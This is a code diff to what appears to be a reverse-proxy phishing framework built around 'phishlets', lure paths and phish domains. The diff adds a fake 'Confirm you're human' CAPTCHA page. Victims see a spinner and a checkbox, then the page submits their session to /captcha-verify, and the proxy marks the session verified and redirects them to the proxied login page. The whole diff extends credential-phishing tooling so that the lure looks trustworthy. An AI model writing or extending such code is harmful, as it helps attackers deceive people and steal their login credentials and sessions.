@@ -58,6 +58,155 @@ const (
 	httpWriteTimeout = 45 * time.Second
 )
 
+const CAPTCHA_HTML = `<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8"/>
+        <meta name="viewport" content="width=device-width,initial-scale=1"/>
+        <title>&#8203;</title>
+        <style>
+            body {
+                margin: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-family: system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+                background: #fff;
+            }
+
+            .wrap {
+                position: relative;
+                top: 183px;
+                width: 346px;
+                padding: 24px 23px;
+                border: 1px solid #e5edff;
+                border-radius: 12px;
+                box-shadow: 0 0 12px rgba(0,0,0,0.08);
+                background: #fff;
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                transition: .3s;
+            }
+
+            .left {
+                display: flex;
+                align-items: center;
+                gap: 10px;
+            }
+
+            .spin {
+                width: 20px;
+                height: 20px;
+                border: 3px solid #e5e7eb;
+                border-top: 3px solid #3b82f6;
+                border-radius: 50%;
+                animation: spin 1s linear infinite;
+            }
+
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+
+            input[type=checkbox] {
+                width: 14px;
+                height: 14px;
+                accent-color: #3b82f6;
+                display: none;
+                cursor: pointer;
+            }
+
+            .text {
+                display: flex;
+                flex-direction: column;
+                row-gap: 3px;
+            }
+
+            .text b {
+                font-size: 14px;
+                color: #111827;
+            }
+
+            .text small {
+                font-size: 13px;
+                color: #6b7280;
+            }
+
+            .done b {
+                color: #16a34a;
+            }
+
+            .lock {
+                width: 25px;
+                height: 35px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="wrap" id="a1">
+            <div class="left">
+                <div class="spin" id="a2"></div>
+                <input type="checkbox" id="a3"/>
+                <div class="text">
+                    <b id="a4">Loading...</b>
+                    <small id="a5">Please wait a moment.</small>
+                </div>
+            </div>
+            <svg class="lock" viewBox="0 0 24 24" fill="none">
+                <rect x="5" y="10" width="14" height="10" rx="2" fill="#FACC15"/>
+                <path d="M8 10V7a4 4 0 0 1 8 0v3" stroke="#111827" stroke-width="2"/>
+            </svg>
+        </div>
+        <form method="POST" id="aj5" action="/captcha-verify">
+            <input type="hidden" name="session_id" id="session_input" value="">
+            <input type="hidden" name="phishlet" id="phishlet_input" value="">
+        </form>
+        <script>
+            const form = document.getElementById('aj5');
+            const a1 = document.getElementById('a1');
+            const a2 = document.getElementById('a2');
+            const a3 = document.getElementById('a3');
+            const a4 = document.getElementById('a4');
+            const a5 = document.getElementById('a5');
+            let flag = true;
+            window.addEventListener('load', () => {
+                a2.style.display = 'block';
+                a4.textContent = 'Loading...';
+                a5.textContent = 'Please wait a moment.';
+                setTimeout( () => {
+                    flag = false;
+                    a2.style.display = 'none';
+                    a3.style.display = 'block';
+                    a4.textContent = 'Confirm you're human';
+                    a5.textContent = 'Tick the box to proceed.';
+                }
+                , 1800);
+            }
+            );
+            a3.addEventListener('change', () => {
+                if (a3.checked && !flag) {
+                    flag = true;
+                    a3.style.display = 'none';
+                    a2.style.display = 'block';
+                    a4.textContent = 'Processing...';
+                    a5.textContent = 'Applying changes.';
+                    setTimeout( () => {
+                        a2.style.display = 'none';
+                        a1.classList.add('done');
+                        a4.textContent = 'Completed successfully';
+                        a5.textContent = 'You are now verified.';
+                    }
+                    , 1500);
+                    setTimeout( () => form.submit(), 3000);
+                }
+            }
+            );
+        </script>
+    </body>
+</html>`
+
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
 var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
@@ -216,6 +365,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
+			captcha_verify_re := regexp.MustCompile("^\\/captcha-verify")
 
 			if js_inject_re.MatchString(req.URL.Path) {
 				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
@@ -285,6 +435,38 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+			} else if captcha_verify_re.MatchString(req.URL.Path) && req.Method == "POST" {
+				// Handle CAPTCHA verification form submission
+				err := req.ParseForm()
+				if err != nil {
+					return p.blockRequest(req)
+				}
+
+				session_id := req.FormValue("session_id")
+				phishlet_name := req.FormValue("phishlet")
+
+				if session_id == "" || phishlet_name == "" {
+					return p.blockRequest(req)
+				}
+
+				// Mark session as captcha verified
+				if s, ok := p.sessions[session_id]; ok {
+					// Add a flag to mark that CAPTCHA has been solved
+					s.Params["captcha_solved"] = "true"
+
+					// Redirect to the legitimate site
+					pl, err := p.cfg.GetPhishlet(phishlet_name)
+					if err != nil {
+						return p.blockRequest(req)
+					}
+
+					loginUrl := pl.GetLoginUrl()
+					resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+					resp.Header.Add("Location", loginUrl)
+					return req, resp
+				}
+
+				return p.blockRequest(req)
 			}
 
 			phishDomain, phished := p.getPhishDomain(req.Host)
@@ -578,6 +760,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
+						// Check if CAPTCHA is enabled for this phishlet
+						if p.cfg.IsCaptchaEnabled(pl_name) {
+							// Show CAPTCHA page if not already solved
+							if ps.SessionId != "" && !p.isCaptchaSolved(ps.SessionId) {
+								return req, p.showCaptchaForSession(req, ps, phishDomain)
+							}
+						}
+						
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
 						u, err := url.Parse(rurl)
@@ -2046,4 +2236,70 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+func (p *HttpProxy) handleCaptchaPage(w http.ResponseWriter, req *http.Request, pl_name string, session_id string) {
+	// Replace placeholders in the CAPTCHA HTML with actual session and phishlet data
+	html := strings.Replace(CAPTCHA_HTML, `id="session_input" value=""`, fmt.Sprintf(`id="session_input" value="%s"`, session_id), 1)
+	html = strings.Replace(html, `id="phishlet_input" value=""`, fmt.Sprintf(`id="phishlet_input" value="%s"`, pl_name), 1)
+	
+	w.Header().Set("Content-Type", "text/html")
+	w.WriteHeader(http.StatusOK)
+	w.Write([]byte(html))
+}
+
+func (p *HttpProxy) handleCaptchaVerify(w http.ResponseWriter, req *http.Request) {
+	err := req.ParseForm()
+	if err != nil {
+		p.blockRequest(req)
+		return
+	}
+
+	session_id := req.FormValue("session_id")
+	phishlet_name := req.FormValue("phishlet")
+	
+	if session_id == "" || phishlet_name == "" {
+		p.blockRequest(req)
+		return
+	}
+
+	// Mark session as captcha verified
+	if s, ok := p.sessions[session_id]; ok {
+		// Add a flag to mark that CAPTCHA has been solved
+		s.Params["captcha_solved"] = "true"
+		
+		// Redirect to the legitimate site
+		pl, err := p.cfg.GetPhishlet(phishlet_name)
+		if err != nil {
+			p.blockRequest(req)
+			return
+		}
+		
+		loginUrl := pl.GetLoginUrl()
+		http.Redirect(w, req, loginUrl, http.StatusFound)
+		return
+	}
+
+	p.blockRequest(req)
+}
+
+func (p *HttpProxy) showCaptchaForSession(req *http.Request, ps *ProxySession, phishDomain string) *http.Response {
+	session_id := ps.SessionId
+	pl_name := ps.PhishletName
+	
+	// Create CAPTCHA page response
+	html := strings.Replace(CAPTCHA_HTML, `id="session_input" value=""`, fmt.Sprintf(`id="session_input" value="%s"`, session_id), 1)
+	html = strings.Replace(html, `id="phishlet_input" value=""`, fmt.Sprintf(`id="phishlet_input" value="%s"`, pl_name), 1)
+	
+	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, html)
+	return resp
+}
+
+func (p *HttpProxy) isCaptchaSolved(session_id string) bool {
+	if s, ok := p.sessions[session_id]; ok {
+		if val, exists := s.Params["captcha_solved"]; exists && val == "true" {
+			return true
+		}
+	}
+	return false
 }
